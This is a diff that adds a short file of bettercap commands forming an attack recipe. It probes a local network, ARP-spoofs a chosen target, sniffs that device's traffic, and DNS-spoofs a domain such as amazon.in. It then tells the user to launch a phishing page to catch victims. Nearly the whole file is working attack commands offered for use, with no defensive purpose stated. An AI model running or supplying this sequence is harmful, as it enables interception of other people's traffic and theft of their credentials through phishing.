@@ -1,0 +1,15 @@
+sudo bettercap 
+net.probe on 
+net.show 
+set arp.spoof.targets enter_target_ip
+arp.spoof on
+net.sniff on - to see websites visited by the target device (and packet as well)
+net.sniff off
+set dns.spoof.domains enter_a_domain_to_be_hacked (Ex: amazon.in)
+dns.spoof on 
+
+CHANGE DEFAULT IP AND PORT OF YOUR CHOSEN PHISHING TOOL AND EXECUTE THE PHISHING PAGE!!!!
+
+
+TRIAL CODE:-
+set dns.spoof.all true/false
